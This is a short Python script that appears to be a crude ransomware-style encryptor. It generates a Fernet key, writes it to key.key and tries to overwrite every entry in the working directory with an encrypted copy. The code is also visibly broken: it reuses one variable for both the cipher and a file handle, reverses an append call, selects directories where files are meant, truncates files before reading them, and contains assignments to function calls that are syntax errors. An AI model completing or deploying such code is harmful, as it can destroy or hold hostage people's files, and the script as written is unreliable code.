import os
from cryptography.fernet import Fernet

def encrypt():
    key = Fernet.generate_key()
    f = Fernet(key)

    with open("key.key", "wb") as f:
        f.write(key)

    cwd = os.getcwd()

    files = []

    items = os.listdir(cwd)
    for file in items:
        if os.path.isdir(file):
            file.append(files)

    for item in files:
        with open(item, "wb") as i:
            i.read() = oldContent
            f.encrypt(oldContent) = newContent
            i.write(newContent)
        

if __name__ == "__main__":
    encrypt()
